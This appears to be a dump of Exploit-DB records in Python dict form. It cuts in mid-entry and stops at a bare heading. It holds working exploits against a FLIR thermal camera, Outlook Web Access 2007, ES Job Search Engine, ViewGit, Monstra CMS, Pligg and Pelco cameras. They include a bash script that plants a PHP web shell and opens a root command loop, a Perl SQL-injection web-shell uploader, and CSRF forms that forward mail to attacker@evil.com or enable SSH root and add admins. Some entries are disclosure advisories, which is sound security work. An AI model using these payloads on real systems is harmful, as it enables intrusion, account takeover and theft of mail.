Server/2.5.29.0\r\n#            Nexus Server/2.5.14.0\r\n#            Nexus Server/2.5.13.0\r\n#            lighttpd/1.4.28\r\n#            PHP/5.4.7\r\n#\r\n#\r\n# Vulnerability discovered by Gjoko \'LiquidWorm\' Krstic\r\n#                             @zeroscience\r\n#\r\n#\r\n# Advisory ID: ZSL-2017-5438\r\n# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5438.php\r\n#\r\n#\r\n# 23.03.2017\r\n#\r\n\r\n\r\nset -euo pipefail\r\nIFS=$\'\\n\\t\'\r\n\r\nif [ "$#" -ne 2 ]; then\r\n\techo -e "Usage: $0 ipaddr port\\\\n"\r\n\texit 1\r\nfi\r\n\r\nip=$1\r\nport=$2\r\necho -e "\\\\nProbing target: http://$ip:$port\\\\n"\r\n\r\npayload="dns%5Bdhcp%5D=%60echo+\\"<?php+system(\\\\\\\\\\$_GET[\'c\']);?>\\">test.php%60&dns%5Bserver1%5D=8.8.8.8&dns%5Bserver2%5D="\r\nhtcode=$(curl -Is -G http://"$ip":"$port"/maintenance/controllerFlirSystem.php -d"$payload" 2>/dev/null | head -1 | awk -F" " \'{print $2}\')\r\n\r\necho -ne "Status: "; echo "$htcode"\r\n\r\nif [ "$htcode" == "200" ]; then\r\n\techo "Target seems OK!"\r\nelse\r\n\techo "Ajdee...something went wrong. Check your target."\r\n\texit 1\r\nfi\r\n\r\necho -e "You got shell!\\\\nCtrl+C to exit.\\\\n"\r\n\r\nwhile true; do\r\n\techo -ne "\\\\033[31m";\r\n\tread -rp "[root@FLIR ~]# " cmd\r\n\techo -ne "\\\\033[00m";\r\n\tshell="http://$ip:$port/maintenance/test.php?c=${cmd// /+}"\r\n\tcurl "$shell"\r\ndone', u'description': u'FLIR Thermal Camera PT-Series (PT-334 200562) - Root Remote Code Execution', u'platform': u'hardware', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2017-09-25T00:00:00+00:00', u'_id': 42785, u'type': u'webapps', u'port': 0}

CVE: []
Description: Outlook Web Access 2007 - Cross-Site Request Forgery
{u'code': u'Source:\r\nhttp://sites.google.com/site/tentacoloviola/pwning-corporate-webmails\r\nDemo:\r\nhttp://www.youtube.com/watch?v=Bx-zfu0uXYg\r\n\r\nAfter Nduja Connection worm and the Memova issue, it\'s now time to shed a light on vulnerabilities affecting corporate webmails. And when corporate webmails are concerned, a unique name springs to mind: Outlook Web Access.  No doubt that Microsoft OWA is the most adopted solution for accessing corporate web mail (wherever MS Exchange is the mail server) and is as well used in some consumer webmail applications (eg. Alice webmail from Telecom Italia).\r\n\r\nThis time the threat comes from insufficient validation of HTTP requests sent to OWA by authenticated users...ehm..well, ok it\'s a CSRF vulnerability...\r\nAs CSRF issues have been already deeply discussed in web security literature, I\'ll give no further explanations on this topic, so let\'s dive into the specific details of the OWA issue.\r\n \r\nBasicly OWA for Exchange 2007 implements no protection against CSRF: \r\n* no REFERER check is performed\r\n* no CSRF nonce/token are managed for HTTP requests\r\n\r\nthis means that ANY web page visited by an user within a valid OWA session can trigger valid requests towards OWA and completely pwn the victim\'s mail account.\r\nAmong the nefarious effects of this attacks:\r\n\r\n1) set a filter (e.g. forward rule) for all incoming e-mails\r\n2) set remote wipe of the mobile device (e.g. iPhone) used to access mail account\r\n\r\nPoC:\r\nHere is the html snipplet that performs the POST request for setting the auto-forward rule:\r\n\r\n<form name="myform" method="post" enctype="text/plain" action=https://webmail.mycorporation.com/owa/ev.owa?oeh=1&ns=Rule&ev=Save> \r\n<input type="hidden" name=\'<params><Id></Id><Name>Test</Name><RecpA4><item><Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"></Rcp></item></RecpA4><Actions><item><rca t="4"></rca></item></Actions></params>\' value=""> \r\n<!--The following line was added by hyperjacker (thank you) in order to make the processing of the form functional-->\r\n<input type="submit">\r\n\r\n</form>\r\n\r\nThe code is quite straightforward, so you just need to put it on a web page, send the link to an OWA user, convince him to visit it and...he\'s pwned.\r\nStupid simple.\r\nInteresting to notice here, this CSRF is performed through some kind of XML cross site POST; all the POST data are sent using the "name" parameter and leaving blank the "value".\r\nIt seems that the server-side XML parser tolerate the trailing "=" character at the end of the POST.\r\n\r\nTimeline\r\nI\'d like to point out that, due to the sensitive domain of this vulnerabilty, I\'ve walked the road of responsable disclosure with Microsoft.\r\nI originally found the vulnerabilty on September 2009 and I immediately reported the issue to MS.\r\nAfter some discussions, MS decided to open a "case" to track this bug.\r\nIn November 2009 the beta release of Exchange 2010 was distributed; giving a look at the OWA 2010 version I realized that in that version the vulnerability was solved.\r\nMS Security Response Center explained me that thanks to my disclosure, the CSRF issue was fixed "on the fly" in the Exchange 2010 beta release.\r\nFor 2007 Exchange version, they decided to pack the fix within the Exchange 2007 Service Pack 3; sorry but 2003 release is no longer supported...\r\nAs the SP3 is now out and available for download (even if MS did not even take care to inform me about this...) I\'m free to publicly disclose the issue.', u'description': u'Outlook Web Access 2007 - Cross-Site Request Forgery', u'platform': u'windows', u'author': u'Rosario Valotta', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-07-08T00:00:00+00:00', u'_id': 14285, u'type': u'webapps', u'port': 0}

CVE: []
Description: ES Job Search Engine 3.0 - SQL Injection
{u'code': u"Title:\r\n======\r\nES Job Search Engine v3.0 - SQL injection vulnerability\r\n\r\n\r\nDate:\r\n=====\r\n2012-08-09\r\n\r\n\r\nReferences:\r\n===========\r\nhttp://www.vulnerability-lab.com/get_content.php?id=675\r\n\r\n\r\nVL-ID:\r\n=====\r\n675\r\n\r\n\r\nCommon Vulnerability Scoring System:\r\n====================================\r\n8.1\r\n\r\n\r\nIntroduction:\r\n=============\r\nES Job Search Engine Script is the most powerful, affordable and flexible spider meta job search engine script. \r\nIn one simple search, ES Job Search Engine gives job seekers free access to thousands of employment opportunities \r\nbecause it search for jobs from many different sites (job websites, job boards, newspapers, associations, company \r\ncareer pages), you\u2019ll find more opportunities here than if you just searched for jobs on a single job posting site.\r\nIt is easy to use: just install it and your job search site is ready.\r\n\r\n(Copy of the Vendor Homepage: http://www.es-job-search-engine.com  )\r\n\r\n\r\nAbstract:\r\n=========\r\nA Vulnerability Laboratory Researcher of the Vulnerability Laboratory Team discovered SQL injection vulnerability in ES Job Search Engine v3.0\r\n\r\n\r\nReport-Timeline:\r\n================\r\n2011-08-09:\tPublic Disclosure\r\n\r\n\r\nStatus:\r\n========\r\nPublished\r\n\r\n\r\nAffected Products:\r\n==================\r\nES\r\nProduct: Job Search Engine v3.0\r\n\r\n\r\nExploitation-Technique:\r\n=======================\r\nRemote\r\n\r\n\r\nSeverity:\r\n=========\r\nCritical\r\n\r\n\r\nDetails:\r\n========\r\nA SQL Injection vulnerability is detected in the ES Job Search Engine v3.0 Web Application. \r\nRemote attackers without access  privileges can execute/inject own sql commands to compromise \r\nthe search engine dbms. The vulnerability is located in the listing modules with bounded vulnerable \r\ncategory parameter. Successful exploitation of the remote sql injection vulnerability result in dbms\r\nor web application compromise. Exploitation requires no privileged user account.\r\n\r\nVulnerable Module(s):\r\n\t\t\t\t[+] ../category/3[>\r\n\r\n\r\nProof of Concept:\r\n=================\r\nThe sql injection vulnerability can be exploited by remote attackers without privileged application user account.\r\nUser inter action is not required to exploit the vulnerability. For demonstration or reproduce ...\r\n\r\nPoC:\r\nhttp://[SERVER]/projects/[PATH]/light/category/-1'+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema=database()--%20-\r\n\r\n\r\nRisk:\r\n=====\r\nThe security risk of the remote sql injection vulnerability is estimated as critical.\r\n\r\n\r\n\r\nCredits:\r\n========\r\nVulnerability Laboratory [Research Team]  - Ibrahim El-Sayed [storm] (strom@vulnerability-lab.com)\r\n\r\n\r\n\r\nDisclaimer:\r\n===========\r\nThe information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, \r\neither expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-\r\nLab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business \r\nprofits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some \r\nstates do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation \r\nmay not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases \r\nor trade with fraud/stolen material.\r\n\r\nDomains:    www.vulnerability-lab.com   \t- www.vuln-lab.com\t\t\t       - www.vulnerability-lab.com/register\r\nContact:    admin@vulnerability-lab.com \t- support@vulnerability-lab.com \t       - research@vulnerability-lab.com\r\nSection:    video.vulnerability-lab.com \t- forum.vulnerability-lab.com \t\t       - news.vulnerability-lab.com\r\nSocial:\t    twitter.com/#!/vuln_lab \t\t- facebook.com/VulnerabilityLab \t       - youtube.com/user/vulnerability0lab\r\nFeeds:\t    vulnerability-lab.com/rss/rss.php\t- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php\r\n\r\nAny modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. \r\nPermission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other \r\nmedia, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and \r\nother information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), \r\nmodify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.\r\n\r\n    \t\t\t\t   \tCopyright \xa9 2012 | Vulnerability Laboratory\r\n\r\n\r\n\r\n-- \r\nVULNERABILITY RESEARCH LABORATORY\r\nLABORATORY RESEARCH TEAM\r\nCONTACT: research@vulnerability-lab.com", u'description': u'ES Job Search Engine 3.0 - SQL Injection', u'platform': u'php', u'author': u'Vulnerability-Lab', u'cve': [], u'source': u'ExploitDB', u'date': u'2012-09-05T00:00:00+00:00', u'_id': 21084, u'type': u'webapps', u'port': 0}

CVE: [u'CVE-2013-2294']
Description: ViewGit 0.0.6 - Multiple Cross-Site Scripting Vulnerabilities
{u'code': u'Vulnerability Report\r\n\r\nAuthor: Matthew R. Bucci <bucci@sas.upenn.edu>\r\nDate: 18 March, 2013\r\n\r\nCVE-2013-2294\r\n\r\nDescription of Vulnerability:\r\n-----------------------------\r\nViewGit "is a git web repository viewer that aims to be easy to set up\r\nand upgrade, light on dependencies, and comfortable to use."\r\n(http://viewgit.fealdia.org/).  \r\nViewGit contains multiple persistent arbitrary script injection (XSS)\r\nvulnerabilities in its "Shortlog" and "Heads" tables.  These\r\nvulnerabilities are triggered by malicious data inserted via the branch\r\nor tag systems of git by one of the users of the repository.\r\n\r\nSystems affected:  \r\n-----------------\r\nViewGit 0.0.6 installed on CentOS 6.3 with PHP 5.3.3 and Apache 2.2.15\r\nwas tested and shown to be vulnerable.\r\n\r\nImpact:\r\n-------\r\nUsers viewing the ViewGit web interface could be exposed to arbitrary\r\nHTML source authored by an attacker, including malicious Flash or Java\r\nobjects, remotely sourced iFrame tags, malicious JavaScript, or other\r\ncontent, that would be associated with the trust zone of the ViewGit web\r\ninterface. This could result in bypass of cross site request forgery\r\nmitigation, account compromise, drive by download attacks or other\r\nimpacts. For more information about the potential impacts of client side\r\nattacks see the BeEF Project at http://beefproject.com/.\r\n\r\nMitigating factors:  \r\n-------------------\r\nIn order to inject arbitrary script, attackers must have the ability to\r\nmanipulate the git repository. Specifically, the attacker must be able\r\nto create branches or tags.\r\n\r\nProof of Concept Exploit:\r\n-------------------------\r\nJavascript commands, the most simple being\r\n<script>alert("XSS")</script>, can be used as the name for either a tag\r\nor branch in any given repository and subsequently executed by pulling\r\nthem up in ViewGit\'s web interface. Tag names will be executed when\r\nviewing the "Shortlog" table, and branch names will be executed when\r\nviewing the "Shortlog" or "Heads" tables.\r\n\r\nSteps to Reproduce:\r\n-------------------\r\nThere are two different avenues of attack, so here are two different\r\nways to reproduce the attack:\r\n\r\nBranch name exploit:\r\n1. Create a git repository and initialize it with "git init".\r\n2. Add this repository to ViewGit by editing its localconfig.php file\r\nand adding it to the \'projects\' array.\r\n3. Now, add a file to the repository and commit it with the commands\r\n"git add fileName" and "git commit"\r\n4. Add a branch via the command "git branch \'<script>alert("XSS")</script>\'"\r\n5. Navigate to viewgit/?a=summary&p=X where X is the name of the\r\nrepository you set up.\r\n6. Observe the Javascript pop-up.\r\n7. Note that this same pop-up will appear when navigating to\r\nviewgit/?a=shortlog&p=X, where X is the name of the repository you set\r\nup, for the same reason because both pages use the same "Shortlog"\r\ntable. Thus both problems are also fixed by the same patch.\r\n\r\nTag name exploit:\r\n1. Create a git repository and initialize it with "git init".\r\n2. Add this repository to ViewGit by editing its localconfig.php file\r\nand adding it to the \'projects\' array.\r\n3. Now, add a file to the repository and commit it with the commands\r\n"git add fileName" and "git commit"\r\n4. Add a tag via the command "git tag -a \'<script>alert("XSS")</script>\'\r\n-m "Message""\r\n5. Navigate to viewgit/?a=summary&p=X where X is the name of the\r\nrepository you set up.\r\n6. Observe the Javascript pop-up.\r\n7. Note that this same pop-up will appear when navigating to\r\nviewgit/?a=shortlog&p=X, where X is the name of the repository you set\r\nup, for the same reason because both pages use the same "Shortlog"\r\ntable. Thus both problems are also fixed by the same patch.\r\n\r\nVendor Response:\r\n----------------\r\nVendor has been alerted to this vulnerability and has applied the\r\nsuggested patches to ViewGit version 0.0.7\r\n\r\nTimeline:\r\n---------\r\nMarch 5th, Vulnerability discovered\r\nMarch 5th, Vendor contact established\r\nMarch 11th, Vendor provided with technical details\r\nMarch 13th, Vendor acknowledged issue\r\nMarch 16th, Patch committed in main branch of the ViewGit project by vendor\r\nMarch 18th, Public release of advisory', u'description': u'ViewGit 0.0.6 - Multiple Cross-Site Scripting Vulnerabilities', u'platform': u'php', u'author': u'Matthew R. Bucci', u'cve': [u'CVE-2013-2294'], u'source': u'ExploitDB', u'date': u'2013-03-19T00:00:00+00:00', u'_id': 24862, u'type': u'webapps', u'port': 0}

CVE: []
Description: Monstra CMS 3.0.3 - Multiple Vulnerabilities
{u'code': u'Exploit Title: Monstra CMS 3.0.3 - Privilege Escalation / Remote Password Change\r\nGoogle Dork: intext:"Powered by Monstra"/users/registration\r\nDate: 2016-03-28\r\nExploit Author: Sarim Kiani\r\nVendor Homepage: http://monstra.org\r\nSoftware Link: http://monstra.org/download\r\nVersion: 3.0.3\r\nTested on: Windows OS\r\n\r\n==================== TIMELINE ====================\r\n- Discovery Date: March 16 2016\r\n- Disclosed to Vendor: March 22 2016\r\n- Vendor Fixed the Issue: March 27 2016\r\n==================================================\r\n\r\nBug Tracking ID: Github Issue # 405\r\nLink: https://github.com/monstra-cms/monstra/issues/405\r\n\r\nApplication Description: Monstra is a modern light weighted Content Management System written in php.\r\n\r\n1. Vulnerability Description:\r\n\r\nAny user can change credentials of other users including the Administrator credentials. This can allow the attacker to gain Administrator access and completely compromise the application.\r\n\r\nOnce logged in as a regular user or successfully registering as a new user, use the following URL to gain information (username) of other users:\r\nhttp://localhost/monstra-3.0.3/users/1\r\n\r\nThe digit \'1\' is of Admin or first user created in the database. By changing the digit, all registered usernames can be found.\r\n\r\nThen by using the \'Edit Profile\' option of own user account, password of any other user including the Administrator can be changed by changing the POST parameters \'user_id\', \'login\' and \'new_password\'.\r\n\r\n\r\n2. Proof of Concept/Code Flaw:\r\n\r\n`In file monstra\\plugins\\box\\users\\users.plugin.php\r\n\r\nFunction: getProfileEdit\r\n\r\nLine No: 233\r\n\r\n  if (Users::$users->update(Request::post(\'user_id\'),\r\n        array(\'login\' => Security::safeName(Request::post(\'login\')),\r\n              \'firstname\' => Request::post(\'firstname\'),\r\n              \'lastname\'  => Request::post(\'lastname\'),\r\n              \'email\'     => Request::post(\'email\'),\r\n              \'skype\'     => Request::post(\'skype\'),\r\n              \'about_me\'  => Request::post(\'about_me\'),\r\n              \'twitter\'   => Request::post(\'twitter\')))) {\r\n\r\n            // Change password\r\n            if (trim(Request::post(\'new_password\')) != \'\') {\r\n                Users::$users->update(Request::post(\'user_id\'), array(\'password\' => Security::encryptPassword(trim(Request::post(\'new_password\')))));\r\n            }\r\n\r\n            Notification::set(\'success\', __(\'Your changes have been saved.\', \'users\'));\r\n            Request::redirect(Site::url().\'/users/\'.$user[\'id\']);\r\n\r\nOn editing profile user id is taken from Request::post(\'user_id\'). An attacker can provide any user id on change password funcionality\r\n\r\nUsers::$users->update --> updates the password`\r\n\r\nHeader:\r\n\r\n> POST /monstra-3.0.3/users/8/edit HTTP/1.1\r\nHost: localhost\r\nContent-Length: 152\r\nCache-Control: max-age=0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nOrigin: http://localhost\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: http://localhost/monstra-3.0.3/users/8/edit\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.8\r\nCookie: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; has_js=1; PHPSESSID=abtuklkn1r0rjbub01527gjav0; _ga=GA1.1.592562515.1457951975; login_attempts=i%3A4%3B\r\n\r\ncsrf=eb616fed8ca93d9de582a4f7d75ee3a3a0d6e3ec&user_id=8&login=user&firstname=&lastname=&email=&twitter=&skype=&about_me=&new_password=&edit_profile=Save\r\n\r\n3. Solution:\r\n\r\nVendor has resolved the issue, use the patch \'User Security Fix # 406\'.\r\n\r\nLink: https://github.com/monstra-cms/monstra/pull/406/commits/2e2a22ee5aafa28771f87c108edea024b618a8d5\r\n\r\n##################################################################################\r\n\r\n#Exploit Title: Monstra CMS 3.0.3 - Persistent XSS \r\n#Google Dork: intext:"Powered by Monstra"\r\n#Date: 2016-03-16\r\n#Exploit Author: Sarim Kiani\r\n#Vendor Homepage: http://monstra.org\r\n#Software Link: http://monstra.org/download\r\n#Version: 3.0.3\r\n#Tested on: Windows OS\r\n\r\n\r\nMonstra is a modern light weighted Content Management System written in php.\r\n\r\n\r\n1. Description\r\n\r\nA Persistent XSS exists in the "Edit Profile" page of the application.\r\n\r\n\r\n2. Proof of Concept\r\n\r\nAny user entering personal information in the "Edit Profile" page of the application can insert XSS Payload in the Form.\r\n\r\nPayload: "><script>alert(1);</script>\r\n\r\nThe following entries on the page are vulnerable to a Persistent XSS payload:\r\n\r\n\'Firstname\', \'Lastname\', \'Email\', \'Twitter\', \'Skype\' and \'About Me\'.\r\n\r\nPOST /monstra-3.0.3/users/8/edit HTTP/1.1\r\nHost: localhost\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://localhost/monstra-3.0.3/users/8/edit\r\nCookie: GUEST_LANGUAGE_ID=en_US; COOKIE_SUPPORT=true; SCREEN_NAME=5374564c7570434448716b3d; SESS7a361a010634612fb69871c3ab2715f1=05e_dlYEnDv4-n3tC89gHEXGp3l-L5CXZY7LNgxFIFg; docebo_session=an9dgdq6rmlg3bv5b29tj45653; PHPSESSID=no30picpa0c5khn86lmcd53cb5; _ga=GA1.1.739562915.1457952544\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 440\r\n\r\ncsrf=685bba70d144b8b8727937b56f5b87e669135fe1&user_id=8&login=user&firstname=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&lastname=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&email=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&twitter=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&skype=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&about_me=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&new_password=&edit_profile=Save\r\n\r\n\r\n3.Solution\r\n\r\nNo newer (fixed) versions are currently available.', u'description': u'Monstra CMS 3.0.3 - Multiple Vulnerabilities', u'platform': u'php', u'author': u'Sarim Kiani', u'cve': [], u'source': u'ExploitDB', u'date': u'2016-03-16T00:00:00+00:00', u'_id': 39567, u'type': u'webapps', u'port': 80}

CVE: []
Description: Pligg 9.9.5b - Arbitrary File Upload / SQL Injection
{u'code': u'#!/usr/bin/perl\r\n\r\n=about\r\n\r\n Pligg 9.9.5 Beta Perl exploit\r\n \r\n AUTHOR\r\n\tdiscovered & written by Ams\r\n\tax330d [doggy] gmail [dot] com\r\n\r\n VULN. DESCRIPTION:\r\n\tVulnerability hides in \'evb/check_url.php\'\r\n\tunfiltered $_GET[\'url\'] parameter.\r\n\tActually, it has filtration.\r\n\tFiltration strips tags and converts html\r\n\tspecial chars , but it is not enough,\r\n\tbecause we can use MySQLs CHAR() function\r\n\tto convert shell to allowed chars.\r\n \r\n EXPLOIT WORK:\r\n\tFirtsly, exploit tryes to get full server\r\n\tpath, but if not succeeded, then it will brute it.\r\n\tIf path has been found then exploit will try\r\n\tto upload tiny shell via SQl-Injection.\r\n \r\n REQUIREMENTS:\r\n\tMySQL should be able to write to file.\r\n\tKnow full server path to portal.\r\n\tmagiq_quotes_gpc=off\r\n    \r\n=cut\r\n\r\nuse strict;\r\nuse warnings;\r\nuse LWP::UserAgent;\r\nuse HTTP::Request::Common;\r\n\r\nBanner();\r\n\r\n$| = 1;\r\nmy $expl_url  = shift or Usage();\r\nmy $serv_path = shift || \'\';\r\n\r\nmy $spider = LWP::UserAgent->new;\r\n$spider->timeout( 9 );\r\n$spider->agent(\'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\');\r\n\r\nmy $def_shell = \'/libs/manager.php\';\r\nmy $shell     = q(<?php @eval(base64_decode($_GET[\'cmd\']));?>);\r\nmy $sql_shell = join \',\', map { ord } split //, $shell;\r\n\r\nmy @paths = qw(\r\n\t/var/www/htdocs /var/www/localhost/htdocs /var/www /var/wwww/hosting /var/www/html /var/www/vhosts\r\n\t/home/www  /home/httpd/vhosts\r\n\t/usr/local/apache/htdocs\r\n\t/www/htdocs\r\n);\r\n\r\nexploit( $expl_url );\r\n\r\nsub exploit {\r\n\t\r\n\t$_ = shift;\r\n\tprint "\\n\\tExploiting: $_";\r\n\t\r\n\tmy ( $packet, $rcvd, $injection );\r\n\tmy ( $prot, $host, $path, ) = m{(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\\?([^#]*))?(?:#(.*))?};\r\n\t\r\n\tmy $req = GET "$prot://$host$path/evb/check_url.php";\r\n\tmy $res = $spider->request( $req );\r\n\t$serv_path = $res->content =~ /template\\s+in\\s+(.*?)config\\.php/\r\n\t\t? $1\r\n\t\t: $serv_path;\r\n\t\r\n\tif ( $serv_path ne \'\' ) {\r\n\t\t\r\n\t\tprint "\\n\\tFound server path: $serv_path";\r\n\t\t\r\n\t\tchomp( $serv_path );\r\n\t\t$injection = "\' UNION SELECT CHAR($sql_shell),\'\' INTO OUTFILE \'$serv_path$def_shell\'--  ";\r\n\t\t$req = GET "$prot://$host$path/evb/check_url.php?url=" . Url_Encode( $injection );\r\n\t\t$res = $spider->request( $req );\r\n\t\t\r\n\t} else {\r\n\t\t\r\n\t\tprint "\\n\\tUnable to find path, starting bruteforce...\\n";\r\n\t\t\r\n\t\tfor $serv_path ( @paths ) {\r\n\t\t\t\r\n\t\t\tprintf "\\tTrying: $serv_path$path$def_shell %s\\r", \'  \' x 10;\r\n\t\t\t\r\n\t\t\tchomp( $serv_path );\r\n\t\t\t$injection = "\' UNION SELECT CHAR($sql_shell),\'\' INTO OUTFILE \'$serv_path$path$def_shell\'--  ";\r\n\t\t\t$req = GET "$prot://$host$path/evb/check_url.php?url=" . Url_Encode( $injection );\r\n\t\t\t$res = $spider->request( $req );\r\n\t\t}\r\n\t}\r\n\t\r\n\t#\tChecking for shell presence\r\n\t$req = HEAD "http://$host$path$def_shell";\r\n\t$res = $spider->request( $req );\r\n\r\n\tif ( $res->status_line =~ /200/ ) {\r\n\t\tprint "\\n\\tExploited: http://$host$path$def_shell\\n\\n";\r\n\t} else {\r\n\t\tprint "\\n\\tExploiting failed\\n\\n";\r\n\t}\r\n\t\r\n}\r\n\r\n#\tLight wheel...\r\nsub Url_Encode {\r\n\t$_ = shift;\r\n\ts/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;\r\n\treturn $_;\r\n}\r\n\r\nsub Usage {\r\n\tprint "\\n\\tUsage:\\t$0 http://site.com [full server path]\r\n\t\r\n\tExample:\r\n\t\t$0 http://localhost/ /var/www/htdocs\r\n\t\t$0 http://localhost/\\n\\n";\r\n\texit;\r\n}\r\n\r\nsub Banner {\r\n\tprint "\r\n\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\t  Pligg 9.9.5 Beta Perl exploit\r\n\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n";\r\n}\r\n\r\n# milw0rm.com [2008-12-22]', u'description': u'Pligg 9.9.5b - Arbitrary File Upload / SQL Injection', u'platform': u'php', u'author': u'Ams', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-12-22T00:00:00+00:00', u'_id': 7544, u'type': u'webapps', u'port': 0}

CVE: []
Description: Pelco Sarix/Spectra Cameras - Cross-Site Request Forgery (Enable SSH Root Access)
{u'code': u'Schneider Electric Pelco Sarix/Spectra Cameras CSRF Enable SSH Root Access\r\n\r\n\r\nVendor: Schneider Electric SE\r\nProduct web page: https://www.pelco.com\r\nAffected version: Sarix Enhanced - Model: IME219 (Firmware: 2.1.2.0.8280-A0.0)\r\n                  Sarix Enhanced - Model: IME119 (Firmware: 2.1.2.0.8280-A0.0)\r\n                  Sarix - Model: D5230 (Firmware: 1.9.2.23-20141118-1.9330-A1.10722)\r\n                  Sarix - Model: ID10DN (Firmware: 1.8.2.18-20121109-1.9110-O3.8503)\r\n                  Spectra Enhanced - Model: D6230 (Firmware: 2.2.0.5.9340-A0.0)\r\n\r\nSummary: Pelco offers the broadest selection of IP cameras designed\r\nfor security surveillance in a wide variety of commercial and industrial\r\nsettings. From our industry-leading fixed and high-speed IP cameras to\r\npanoramic, thermal imaging, explosionproof and more, we offer a camera\r\nfor any environment, any lighting condition and any application.\r\nWhen nothing but the best will do. Sarix\u2122 Enhanced Range cameras\r\nprovide the most robust feature-set for your mission-critical applications.\r\nWith SureVision\u2122 3.0, Sarix Enhanced delivers the best possible image\r\nin difficult lighting conditions such as a combination of bright areas,\r\nshaded areas, and intense light. Designed with superior reliability,\r\nfault tolerance, and processing speed, these rugged fixed IP cameras\r\nensure you always get the video that you need.\r\n\r\nDesc: The application interface allows users to perform certain actions\r\nvia HTTP requests without performing any validity checks to verify the\r\nrequests. This can be exploited to perform certain actions with administrative\r\nprivileges if a logged-in user visits a malicious web site.\r\n\r\nTested on: Linux 2.6.10_mvl401-1721-pelco_evolution #1 Tue Nov 18 21:15:30 EST 2014 armv5tejl unknown\r\n           MontaVista(R) Linux(R) Professional Edition 4.0.1 (0600980)\r\n           Lighttpd/1.4.28\r\n           PHP/5.3.0\r\n\r\n\r\nVulnerability discovered by Gjoko \'LiquidWorm\' Krstic\r\n                            @zeroscience\r\n\r\n\r\nAdvisory ID: ZSL-2017-5416\r\nAdvisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5416.php\r\n\r\n\r\n07.04.2017\r\n\r\n--\r\n\r\n\r\nCSRF enable ssh root access:\r\n----------------------------\r\n\r\n<html>\r\n  <body>\r\n  <script>history.pushState(\'\', \'\', \'/\')</script>\r\n    <form action="http://192.168.1.1/setup/network/ssh/update" method="POST">\r\n      <input type="hidden" name="enabled" value="1" />\r\n      <input type="hidden" name="password" value="root123" />\r\n      <input type="hidden" name="password&#95;confirmation" value="root123" />\r\n      <input type="submit" value="Go root" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\n\r\n\r\nCSRF add admin:\r\n---------------\r\n\r\n<html>\r\n  <body>\r\n  <script>history.pushState(\'\', \'\', \'/\')</script>\r\n    <form action="http://192.168.1.1/setup/auth/users/create" method="POST">\r\n      <input type="hidden" name="original&#95;username" value="" />\r\n      <input type="hidden" name="mode" value="create" />\r\n      <input type="hidden" name="group" value="admins" />\r\n      <input type="hidden" name="username" value="pelco_admin" />\r\n      <input type="hidden" name="password" value="pelco_pass" />\r\n      <input type="hidden" name="password&#95;confirmation" value="pelco_pass" />\r\n      <input type="submit" value="Add admin" />\r\n    </form>\r\n  </body>\r\n</html>', u'description': u'Pelco Sarix/Spectra Cameras - Cross-Site Request Forgery (Enable SSH Root Access)', u'platform': u'hardware', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2017-07-10T00:00:00+00:00', u'_id': 42308, u'type': u'webapps', u'port': 0}

CVE: []
Description: Kmita Tellfriend 2.0 - 'file' Remote File Inclusion
